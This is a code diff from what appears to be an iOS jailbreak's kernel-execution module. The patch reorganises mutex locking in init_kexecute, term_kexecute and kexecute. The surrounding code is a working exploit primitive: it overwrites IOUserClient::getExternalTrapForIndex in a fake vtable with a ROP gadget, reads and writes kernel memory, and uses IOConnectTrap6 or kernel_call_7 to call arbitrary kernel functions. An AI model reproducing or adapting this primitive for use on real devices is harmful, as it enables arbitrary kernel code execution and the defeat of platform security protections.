@@ -34,7 +34,6 @@ static mach_port_t prepare_user_client()
     return user_client;
 }
 
-static pthread_mutex_t kexecute_lock;
 static mach_port_t user_client;
 static uint64_t IOSurfaceRootUserClient_port;
 static uint64_t IOSurfaceRootUserClient_addr;
@@ -42,6 +41,7 @@ static uint64_t fake_vtable;
 static uint64_t fake_client;
 static const int fake_kalloc_size = 0x1000;
 #endif
+static pthread_mutex_t kexecute_lock;
 
 void init_kexecute()
 {
@@ -89,8 +89,8 @@ void init_kexecute()
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
     WriteKernel64(fake_vtable + 8 * 0xB7, GETOFFSET(add_x0_x0_0x40_ret));
 
-    pthread_mutex_init(&kexecute_lock, NULL);
 #endif
+    pthread_mutex_init(&kexecute_lock, NULL);
 }
 
 void term_kexecute()
@@ -106,12 +106,11 @@ void term_kexecute()
 
 uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6)
 {
-#if __arm64e__
-    
-    return kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
-#else
+    uint64_t returnval = 0;
     pthread_mutex_lock(&kexecute_lock);
-
+#if __arm64e__
+    returnval = kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
+#else
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
     // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
     // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
@@ -126,12 +125,10 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
     uint64_t offx28 = ReadKernel64(fake_client + 0x48);
     WriteKernel64(fake_client + 0x40, x0);
     WriteKernel64(fake_client + 0x48, addr);
-    uint64_t returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
+    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
     WriteKernel64(fake_client + 0x40, offx20);
     WriteKernel64(fake_client + 0x48, offx28);
-
-    pthread_mutex_unlock(&kexecute_lock);
-
-    return returnval;
 #endif
+    pthread_mutex_unlock(&kexecute_lock);
+    return returnval;
 }
